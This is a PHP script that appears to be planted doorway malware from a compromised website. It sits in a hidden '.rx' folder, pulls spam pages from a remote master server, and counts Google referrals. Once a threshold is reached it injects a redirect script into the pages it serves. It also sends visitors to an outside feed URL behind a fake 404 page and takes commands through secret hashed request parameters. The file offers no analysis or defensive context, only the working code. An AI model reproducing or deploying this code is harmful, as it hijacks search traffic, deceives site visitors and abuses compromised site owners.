<?php
// REVISION: $Rev: 761 $
error_reporting(0);
header('Content-type: text/html');

class RemotePage
{
  var $myUrl = 'http://www.sonotsoft.com/twitter/SpryAssets/.rx/';
  var $feedUrl = 'http://tooooo.biz/onlinefl/${key}/';
  var $waitTimeout = 5; // seconds
  var $useCurl = 0;
  
  var $googleRefNumToAllowRedirect = 5;
  
  var $keywordSeparator = '-';
  var $defaultPage = 'index';
  var $searchReferers = 'live|msn|yahoo|google|ask|aol';
  
  var $masterUrl = 'http://dind.gribokhost.com/';
  
  //var $masterUrl = 'http://ddg.local/';
  //var $myUrl = 'http://ddg.local/door/';
  
  // !!! DO NOT CHANGE THIS !!!
  var $seal = '7aY#4EwrU_eC2AbEcuP?8keYe&ruQuxE=R46eQ38eHE27aZeFr7W7eSp=752xen?';
  
  function RemotePage()
  {
  }
  
  
  function _processReferer()
  {
    //print "HTTP_REFERER: '{$_SERVER['HTTP_REFERER']}'<br>\n"; // TODO: delete this line
    if (preg_match('/google/i', $_SERVER['HTTP_REFERER']))
    {
      $cnt = $this->_increaseGoogleRefCount();
      //print "CNT: $cnt<br>\n"; // TODO: delete this line
      if ($cnt != -1 && $cnt >= $this->googleRefNumToAllowRedirect && !$this->_isRedirectRequired())
      {
        $this->_allowRedirectByGoogle();
      };
    };
  }
  
  function _increaseGoogleRefCount()
  {
    $cnt = -1;
    $hf = @fopen(".cache/.refgg", "a+");
    if (false == $hf)
      return -1;
    if (!@flock($hf, LOCK_EX))
    {
      @fclose($hf);
      return -1;
    };
    fseek($hf, 0);
    $cnt = intval(fgets($hf));
    fseek($hf, 0);
    ftruncate($hf, 0);
    ++$cnt;
    fwrite($hf, strval($cnt));
    fclose($hf);
    return $cnt;
  }
  
  function _getGoogleRefCount()
  {
    $cnt = -1;
    $hf = @fopen(".cache/.refgg", "r");
    if (false == $hf)
      return -1;
    if (!@flock($hf, LOCK_SH))
    {
      @fclose($hf);
      return -1;
    };
    fseek($hf, 0);
    $cnt = intval(fgets($hf));
    fclose($hf);
    return $cnt;
  }
  
  function _allowRedirectByGoogle()
  {
    $status = $this->allowRedirect('enable');
    if ($status == 'nocachedir' || $status == 'enabled')
    {
      require_once('_http.php');
      $url = $this->masterUrl . 'remote.php?u=' . urlencode($this->myUrl) . '&a=enable_redirect';
      //print "ENABLING REDIRECT WITH URL: {$url}<br>\n"; // TODO: delete this line
      //print "URL: $url";
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      //print "RESULT: {$page}<br>\n"; // TODO: delete this line
      if (!$page)
        return false;
      return true;
    };
    return false;
  }
  
  function _getCachedPage($pagename)
  {
    $pagename = strtr($pagename, " \t", "___");
    $page = file_get_contents(".cache/{$pagename}.cache");
    if (false == $page)
    {
      return false;
    };
    $page = unserialize($page);
    if ($page['seal'] != $this->seal)
    {
      @unlink(".cache/{$pagename}.cache");
      return false;
    };
    $this->cacheStatus = 'EXISTS';
    @header("X-Page-Cached: exists");
    return $page;
  }
  
  function _cachePage($pagename, $page)
  {
    if ($page['error'])
    {
      @header("X-Page-Cached: failure");
      #print "X-Page-Cached: failure\n";
      return false;
    };
    unset($page['redirect_disabled']);
    $pagename = strtr($pagename, " \t", "___");
    $hf = @fopen(".cache/{$pagename}.cache", "wb");
    if (!$hf)
    {
      @header("X-Page-Cached: failure");
      #print "X-Page-Cached: failure\n";
      return false;
    };
    fwrite($hf, serialize($page));
    fclose($hf);
    @header("X-Page-Cached: success");
    return true;
  }
  
  function _getRemotePage($pagename, $forceReCache)
  {
    if ($forceReCache || false == ($page = $this->_getCachedPage($pagename)))
    {
      require_once('_http.php');
      $url = $this->masterUrl . 'gw.php?u=' . urlencode($this->myUrl) . '&p=' . urlencode($pagename) . '&s=1';
      //print "URL: $url";
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      //print_r($page);
      if (!$page)
        return false;
      $page = unserialize($page);
     	//print_r($page);
      if ($page['seal'] != $this->seal)
      {
      	//print "No seal ";
        return false;
      }
      $this->redirectDisabled = $page['redirect_disabled'];
      $this->cacheStatus = $this->_cachePage($pagename, $page) ? 'SUCCESS' : 'FAILURE';
    };
    return $page; 
  }
  
  function _isRedirectRequired($referer)
  {
    // Detecting whether redirect is required
    if (is_file('.cache/.noredir') || $this->redirectDisabled == 'disabled')
      return false;
    else
      return true;
  }
  
  function allowRedirect($allow)
  {
    if ($allow == 'disable')
      @touch('.cache/.noredir');
    else
      @unlink('.cache/.noredir');
    if (!is_dir('.cache') || !is_writable('.cache'))
      return 'nocachedir';
    return (file_exists('.cache/.noredir') ? 'disabled' : 'enabled');
  }
  
  function displayPage($pagename, $referer, $cacheOnly, $forceReCache)
  {
    if ($pagename == '')
      $pagename = $this->defaultPage;
    $this->_processReferer();
    $page = $this->_getRemotePage($pagename, $forceReCache);
    //print "PAGE: "; print_r($page);
    if ($page === false || $page['error'])
    {
      if ($cacheOnly)
        die("PAGE CACHING RESULT: FAILURE\n");
      if ($this->feedUrl)
      {
        //header("{$_SERVER['SERVER_PROTOCOL']} 302 Moved Temporarily");
        $url = str_replace('${key}', str_replace($this->keywordSeparator, '%20', $pagename), $this->feedUrl);
        header("Location: {$url}");
      }
      else
      {
        header("{$_SERVER['SERVER_PROTOCOL']} 404 Not Found");
      };
      die (<<<EOM
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>
<hr>
<address>{$_SERVER['SERVER_SOFTWARE']} Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}</address>
</body></html>
EOM
      );
    };
    if ($cacheOnly)
      die("PAGE CACHING RESULT: {$this->cacheStatus}\n");
    if ($this->_isRedirectRequired($referer))
      $page['page'] = str_replace('$[[REDIRECT]]', $page['script'], $page['page']);
    else
      $page['page'] = str_replace('$[[REDIRECT]]', '', $page['page']);
    $page['script'] = '';
//    print_r($page);
    print $page['page'];
  }
  
  function processRequest($p, $referer, $cacheOnly, $forceReCache)
  {
  	if (preg_match('/.js$/', $p))
  		header('Content-type: text/javascript');
  	$this->displayPage($p, $referer, $cacheOnly, $forceReCache);
  }
};

$page = new RemotePage();
if (array_key_exists('d98a70509b4b1552243f07629a643439_redir', $_REQUEST))
{
  $status = $page->allowRedirect($_REQUEST['d98a70509b4b1552243f07629a643439_redir']);
  die("REDIRECT [d98a70509b4b1552243f07629a643439_redir] STATUS: [{$status}]\n");
}
else if ($_REQUEST['d98a70509b4b1552243f07629a643439_gref'] == 'count')
{
  $cnt = $page->_getGoogleRefCount();
  die("GREF [d98a70509b4b1552243f07629a643439_gref] COUNT: [{$cnt}]\n");
}
else
{
  $page->processRequest($_REQUEST['p'], $_SERVER['HTTP_REFERER'], $_REQUEST['__cacheonly'] == 'true', $_REQUEST['__forcerecache'] == 'true');
};

?>